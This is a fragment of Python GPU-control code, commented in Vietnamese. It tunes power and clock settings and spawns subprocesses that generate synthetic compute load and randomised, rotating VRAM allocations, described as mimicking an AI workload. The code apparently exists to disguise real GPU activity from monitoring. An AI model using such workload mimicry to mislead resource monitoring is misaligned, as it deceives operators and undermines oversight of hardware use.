                    current_sm = pynvml.nvmlDeviceGetClockInfo(handle, pynvml.NVML_CLOCK_SM)
                    params['sm_clock'] = int(min(1245, current_sm * (1.0 + clock_var * 0.2)))
            except Exception:
                # fallback an toàn
                params['sm_clock'] = 1020
            params['mem_clock'] = params.get('mem_clock', 877)
            params['temperature'] = int(self.temp_warning)
            params['vram_allocation'] = vram_alloc
            params['window_sec'] = self.per_pid_window_sec or 0
        elif s in ('temperature',):
            params['temperature'] = int(self.temp_warning)
            params['power_limit'] = target_power
        elif s in ('memory', 'vram'):
            params['vram_allocation'] = vram_alloc
        else:
            # Mặc định coi như GPU strategy
            params['power_limit'] = target_power
            params['mem_clock'] = 877
            params['temperature'] = int(self.temp_warning)

        return params

    def _apply_compute_simulation(self, gpu_index: int, params: Dict[str, Any]) -> bool:
        """
        Apply compute load simulation
        """
        self.logger.debug(f"🔢 [OHC._apply_compute_simulation] Entry - GPU: {gpu_index}")
        
        try:
            pattern = params.get('compute_pattern', 'sine')
            duration = params.get('compute_duration', 10)
            intensity = params.get('compute_intensity', 0.5)
            self.logger.info(f"🎯 [OHC._apply_compute_simulation] Starting {pattern} pattern for {duration}s at {intensity*100}% intensity")
            
            # Calculate duty cycle
            target_power = params.get('power_limit', self.baseline_power)
            duty_cycle = target_power / self.baseline_power
            duty_cycle = max(0.5, min(1.0, duty_cycle))
            self.logger.debug(f"📊 [OHC._apply_compute_simulation] Duty cycle: {duty_cycle:.2f}")
            
            # Launch compute kernel
            compute_cmd = f"""
python3 -c "
import torch
import time
import sys

try:
    a = torch.randn(2000, 2000, device='cuda')
    b = torch.randn(2000, 2000, device='cuda')
    
    work_time = {duty_cycle * 0.1}
    sleep_time = {(1 - duty_cycle) * 0.1}
    
    for _ in range(10):
        start = time.time()
        while time.time() - start < work_time:
            c = torch.matmul(a, b)
            torch.cuda.synchronize()
        time.sleep(sleep_time)
except Exception as e:
    print(f'Compute error: {{e}}', file=sys.stderr)
" &
            """
            
            env = os.environ.copy()
            env['CUDA_VISIBLE_DEVICES'] = str(gpu_index)
            
            proc = subprocess.Popen(
                compute_cmd, 
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                env=env
            )
            
            self.active_subprocesses.append(proc)
            self.logger.info(f"✅ [OHC._apply_compute_simulation] Started compute PID: {proc.pid}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"❌ [OHC._apply_compute_simulation] Failed: {e}", exc_info=True)
            return False
    
    def _verify_and_adjust_baseline(self, gpu_index: int) -> bool:
        """Verify and adjust baseline metrics and return boolean status"""
        self.logger.debug(f"🔧 [OHC._verify_and_adjust_baseline] Entry - verifying baseline for GPU {gpu_index}")
        
        try:
            status_ok = True
            actual_temp = self.gpu_manager.get_gpu_temperature(gpu_index)
            if actual_temp and abs(actual_temp - self.baseline_temp) > 5:
                self.logger.info(f"📊 [OHC._verify_and_adjust_baseline] Adjusting baseline temp: {self.baseline_temp}°C → {actual_temp}°C (delta: {abs(actual_temp - self.baseline_temp)}°C)")
                self.baseline_temp = actual_temp
                status_ok = False
            else:
                self.logger.debug(f"✅ [OHC._verify_and_adjust_baseline] Baseline temp OK: {self.baseline_temp}°C (actual: {actual_temp}°C)")
            
            actual_power = self._get_current_power(gpu_index)
            if actual_power is not None:
                # Guard công suất thấp bất thường: tránh set baseline khi reading quá thấp
                min_allowed_power = max(20, int(0.1 * self.baseline_power))
                if actual_power < min_allowed_power:
                    self.logger.warning(f"⚠️ [OHC._verify_and_adjust_baseline] Power reading too low ({actual_power}W < {min_allowed_power}W). Skip baseline update.")
                    status_ok = False
                elif abs(actual_power - self.baseline_power) > 10:
                    self.logger.info(f"⚡ [OHC._verify_and_adjust_baseline] Adjusting baseline power: {self.baseline_power}W → {actual_power}W (delta: {abs(actual_power - self.baseline_power)}W)")
                    self.baseline_power = actual_power
                    status_ok = False
                else:
                    self.logger.debug(f"✅ [OHC._verify_and_adjust_baseline] Baseline power OK: {self.baseline_power}W (actual: {actual_power}W)")
            
            return status_ok
        except Exception as e:
            self.logger.warning(f"⚠️ [OHC._verify_and_adjust_baseline] Baseline verification failed: {e}")
            return False

    def _manage_vram_allocation(self, gpu_index: int, params: Dict[str, Any]) -> bool:
        """
        Manage VRAM để mimic AI workload
        
        :param params: Control parameters
        :return: Success status
        """
        self.logger.debug(f"💾 [OHC._manage_vram_allocation] Entry - GPU: {gpu_index}, params: {list(params.keys())}")
        
        try:
            target_percent = params.get('vram_allocation', self.profile.get('vram_allocation', 0.5))
            self.logger.debug(f"📊 [OHC._manage_vram_allocation] Target VRAM allocation: {target_percent*100}%")
            
            # Get available VRAM
            total_vram = self._get_total_vram(gpu_index)
            target_bytes = int(total_vram * target_percent)
            target_mb = target_bytes // (1024**2)
            self.logger.info(f"🎯 [OHC._manage_vram_allocation] Allocating {target_mb}MB ({target_percent*100}% of {total_vram//1024**3}GB) on GPU {gpu_index}")
            
            # Allocate với rotation pattern
            allocation_cmd = f"""
python3 -c "
import torch
import time
import random
import sys

try:
    # Target allocation
    target_mb = {target_mb}
    
    # Allocate với variation
    allocated = []
    for i in range(3):
        size = int(target_mb * random.uniform(0.3, 0.4))
        tensor = torch.zeros(
            size, 1024, 1024 // 4,
            dtype=torch.float32, 
            device='cuda'
        )
        allocated.append(tensor)
        time.sleep(2)
    
    # Hold và rotate
    for _ in range(10):
        # Randomly deallocate and reallocate
        if random.random() < 0.3:
            idx = random.randint(0, 2)
            del allocated[idx]
            torch.cuda.empty_cache()
            
            size = int(target_mb * random.uniform(0.3, 0.4))
            allocated.insert(idx,
                torch.zeros(
                    size, 1024, 1024 // 4,
                    dtype=torch.float32, 
                    device='cuda'
                )
            )
        
        # Small computation để maintain activity
        if allocated:
            allocated[0] *= 1.001
        
        time.sleep(3)
except Exception as e:
    print(f'VRAM allocation error: {{e}}', file=sys.stderr)
" &
            """
            
            env = os.environ.copy()
            env['CUDA_VISIBLE_DEVICES'] = str(gpu_index)
            proc = subprocess.Popen(
                allocation_cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                env=env
            )
            
            self.active_subprocesses.append(proc)
            self.logger.info(f"✅ [OHC._manage_vram_allocation] Started VRAM allocation subprocess PID: {proc.pid} on GPU {gpu_index}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"❌ [OHC._manage_vram_allocation] Failed to manage VRAM: {e}", exc_info=True)
            return False
    
    def _get_total_vram(self, gpu_index: int) -> int:
        """Get total VRAM in bytes"""
        self.logger.debug(f"🔍 [OHC._get_total_vram] Getting total VRAM for GPU {gpu_index}")
        
        try:
            handle = self.gpu_manager.get_handle(gpu_index)
            if handle:
                mem_info = pynvml.nvmlDeviceGetMemoryInfo(handle)
                total_gb = mem_info.total / (1024**3)
                self.logger.debug(f"✅ [OHC._get_total_vram] GPU {gpu_index} has {total_gb:.2f}GB VRAM")
                return mem_info.total
        except Exception as e:
            self.logger.warning(f"⚠️ [OHC._get_total_vram] Cannot read VRAM for GPU {gpu_index}: {e}, using default 8GB")
        
        return 8 * 1024**3  # Default 8GB to bytes
    
    def _should_verify_baseline(self) -> bool:
        """Check if baseline verification is needed"""
        try:
            # Get current metrics
            gpu_index = 0  # Default GPU
            current_power = self._get_current_power(gpu_index)
            current_temp = self.gpu_manager.get_gpu_temperature(gpu_index)
            
            # Check power deviation
            if current_power:
                power_deviation = abs(current_power - self.baseline_power) / self.baseline_power
                if power_deviation > 0.3:  # 30% deviation
                    self.logger.debug(f"🔍 [OHC._should_verify_baseline] Power deviation detected: {power_deviation:.1%}")
                    return True
            
            # Check temperature deviation  
            if current_temp:
                temp_deviation = abs(current_temp - self.baseline_temp)
                if temp_deviation > 10:  # 10°C deviation
                    self.logger.debug(f"🔍 [OHC._should_verify_baseline] Temperature deviation detected: {temp_deviation:.1f}°C")
                    return True
            
            return False
            
        except Exception as e:
            self.logger.warning(f"⚠️ [OHC._should_verify_baseline] Check failed: {e}")
            return False

    def _schedule_restore(self, pid: int, gpu_index: int, window_sec: int):
        # Schedule restore of device-wide settings after time window (per-PID simulation window)
        self.logger.debug(f"⏰ [OHC._schedule_restore] Scheduling restore for PID {pid} on GPU {gpu_index} after {window_sec}s")
        
        def _restore_task():
            try:
                self.logger.debug(f"⏳ [OHC._schedule_restore] Waiting {window_sec}s before restore...")
                time.sleep(max(0, window_sec))
                # Restore settings modified by PID
                self.logger.info(f"🔄 [OHC._schedule_restore] Restoring GPU settings for PID {pid}")
                self.gpu_manager.restore_gpu_settings_for_pid(pid)
                # Clean up simulation processes
                self.cleanup()
                self.logger.info(f"✅ [OHC._schedule_restore] Restored GPU settings after {window_sec}s for PID={pid} (GPU={gpu_index})")
            except Exception as e:
                self.logger.warning(f"⚠️ [OHC._schedule_restore] Error during auto-restore for PID={pid}: {e}")

        t = threading.Thread(target=_restore_task, daemon=True)
        t.start()
        self.logger.debug(f"✅ [OHC._schedule_restore] Restore thread started for PID {pid}")
    
    def cleanup(self):
        # Clean up resources
        self.logger.info(f"🧹 [OHC.cleanup] Starting cleanup - {len(self.active_subprocesses)} active subprocess(es)")
        
        # Terminate subprocesses
        for proc in self.active_subprocesses:
            try:
                if proc.poll() is None:
                    self.logger.debug(f"🛑 [OHC.cleanup] Terminating subprocess PID: {proc.pid}")
                    proc.terminate()
                    proc.wait(timeout=2)
                    self.logger.debug(f"✅ [OHC.cleanup] Subprocess PID {proc.pid} terminated")
            except Exception as e:
                self.logger.warning(f"⚠️ [OHC.cleanup] Failed to terminate subprocess PID {proc.pid}: {e}")
        
        self.active_subprocesses.clear()
        self.logger.info("✅ [OHC.cleanup] OptimizedHardwareController cleanup complete")
